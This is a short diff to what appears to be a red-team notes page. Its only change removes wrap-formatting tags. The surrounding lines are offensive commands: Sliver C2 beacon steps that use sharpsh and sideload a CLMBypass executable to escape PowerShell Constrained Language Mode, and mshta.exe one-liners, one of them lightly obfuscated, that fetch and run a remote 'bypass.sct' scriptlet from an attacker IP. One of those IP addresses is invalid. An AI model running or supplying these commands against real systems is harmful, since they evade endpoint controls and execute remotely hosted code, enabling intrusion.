@@ -66,7 +66,6 @@ ConstrainedLanguage
 
 ### Sliver - Constrained Language Mode (CLM) Bypass
 
-{% code overflow="wrap" %}
 ```bash
 # For disabling in sliver, leverage sharpsh with its built in CLM bypass
 sliver (beacon) > sharpsh -- -c '$ExecutionContext.SessionState.LanguageMode'
@@ -76,7 +75,6 @@ sliver (beacon) > sideload /home/kali/ToolLibrary/CLMBypass/CLMBypass.exe
 
 # All sliver shell code runners will be located in ToolLibrary/Sliver-Setup and ToolLibrary/Sliver-Setup-HTTPS
 ```
-{% endcode %}
 
 ### Shell - Constrained Language Mode (CLM) Bypass
 
@@ -144,7 +142,6 @@ using `mshta.exe` is another LOLBIN that uses Microsoft's HTML Applications (MSH
 
 ### References
 
-{% code overflow="wrap" %}
 ```bash
 # utility location (32-bit)
 C:\Windows\System32\mshta.exe
@@ -159,7 +156,6 @@ mshta.exe "javascript:GetObject('script:http://192.168.45.277/bypass.sct');close
 # slightly offuscated Execution of Jscript
 mshta.exe "javascript:a=GetObject;b='script:http://192.168.45.227/bypass.sct';a(b);close();"
 ```
-{% endcode %}
 
 ***
 
